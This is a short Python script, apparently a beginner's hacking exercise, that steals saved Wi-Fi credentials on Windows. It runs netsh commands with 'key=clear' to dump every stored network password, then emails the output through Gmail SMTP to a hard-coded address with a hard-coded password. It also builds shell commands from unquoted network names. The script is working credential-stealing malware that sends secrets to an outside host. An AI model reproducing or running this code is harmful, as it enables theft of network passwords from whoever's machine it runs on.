#!usr/bin/evn python

import subprocess, smtplib, re,sys

def send_male(email, password, massage):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, massage)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command,shell=True).decode(sys.stdout.encoding).strip()
network_names_list = re.findall("(?:Profile\s*:\s)(.*)",networks)

result = ""

for network_name in network_names_list:
    print(network_name)
    command = f"netsh wlan show profile {network_name} key=clear"
    current_result = subprocess.check_output(command,shell=True).decode(sys.stdout.encoding).strip()
    result += current_result

print(result)
send_male(" wejhoon@gmail.com","HackerEmail",result)
